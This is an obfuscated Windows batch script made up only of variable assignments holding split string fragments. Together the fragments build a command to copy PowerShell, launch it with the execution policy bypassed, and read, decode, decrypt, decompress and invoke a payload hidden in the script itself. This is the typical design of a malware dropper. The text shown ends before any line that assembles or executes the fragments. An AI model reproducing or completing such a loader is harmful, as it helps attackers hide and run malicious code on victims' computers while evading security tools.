@echo off
set "EjmqmVoTOw=rs"
set "qRemArsfPn=st"
set "JcNCllFgjV=rS"
set "MwXJjoyhUq=ws"
set "ZlOFpaJFGR=s\"
set "pBMqbpApIA=he"
set "XcnqHlMpBz=\v"
set "PuYLIPPcVy=Wi"
set "GQCatzhaRz=nd"
set "xybSWuhBmI=ow"
set "ECvGUOUjRl= /"
set "ZtGmsynJMM=xe"
set "lbOtClOHrw=0\"
set "qXoTrLrwUE=we"
set "DkOiSvGtMv=we"
set "EvUVSToyzc=.e"
set "oWHrgRiAEf=py"
set "dBOMXnnvIP=po"
set "BPpcyanFAg=ll"
set "HItIRbkblC=y "
set "OtctOOyePB=do"
set "QCtaxZEVif=32"
set "uHqpHSBPEq= C"
set "HFQVtPlYSb=1."
set "cyUfJQqNME=Sy"
set "IoPnyvbXLs=em"
set "IDPsjOIHHo=in"
set "hypzrZoFjD=co"
set "etPIshhCeY=\W"
set "HTOfexSWMY=:\"
set "xeXevgReXf=he"
set "bxoflPhesx=ll"
set "nzSNKnMaQJ=Po"
set "fHUpfzNpyh=cd"
set "FQPqAvSFor= %~dp0"
set "MCuuQBMkPH=);$e"
set "rXToKcAkSy=dY);"
set "AAxbVSQdKt=lit("
set "qXdyvCjLtT=R5jf"
set "XsBjdsRemk=6] -"
set "caRLgDMmNq=Secu"
set "oMrPnGbYFw=ewLi"
set "WlZmSpgRRA=hgO."
set "zmGQYyTdZb=.Dis"
set "gUhvxnNdVO=ke($"
set "CRrwQCrukz=ect "
set "rPZNPyzdLd=-ep "
set "XSxxPrDbhM=[Env"
set "WkiILfqJym=[]] "
set "ivWrmRtBdy=;$Ya"
set "UWgqUECkOG=ZEEC"
set "cleVdSUNKV=Secu"
set "JCKmdQOJpR=ateD"
set "qDwGgtcrTy=gth)"
set "aRMitHpBKg=form"
set "DvAVHKiCrc=esaB"
set "UGDJQSMqmb=ct S"
set "KowALpnKEl=e]::"
set "sPopUcHAFO=('%~f0'"
set "HMDBfWSPRd='[-1"
set "YiKQJCiKIu=rofi"
set "xXtKHTMypG=comp"
set "XSKgUkTNlz=$pVR"
set "YALAtdTVZi=ptor"
set "cxjOQrwfFH=.IO."
set "zGZKEvjhdW=-nop"
set "nLCEeTlnBr=]::("
set "xHRpsikpOR=tem."
set "eODHpoxsuf=kyhK"
set "wCbxmlKflh=ispo"
set "DKHFTFzEun=mory"
set "uKITZPudnj=TG ="
set "BcqCiVUiTs=stem"
set "DUKkXBrcJT=YaVT"
set "zhWmprRQnX=j, 0"
set "fygrDnBAJb=fApB"
set "YfdInHVbTg=7;$u"
set "KPLSKUrvAx=ach "
set "QuIXvLaeyC=($oR"
set "PtFijDUToR=stem"
set "pmvFeozyxr=ahpW"
set "qyfIVEDoGF=fApB"
set "saDxXkrGrN=, (,"
set "KSiHuEWZtW=::De"
set "jGxWmORdVi=bjec"
set "bqfrlRgLNm=$VeB"
set "NKckBsUCvD=.Cop"
set "BAlvwWpRUn=[-1."
set "pbigNjbfOn=n ''"
set "EZxxqUYLWo=Stre"
set "hSqbOwteov=join"
set "NEIARygzix=Comp"
set "UYPdsCjnGX=ypto"
set "IHEestCGEs=th('"
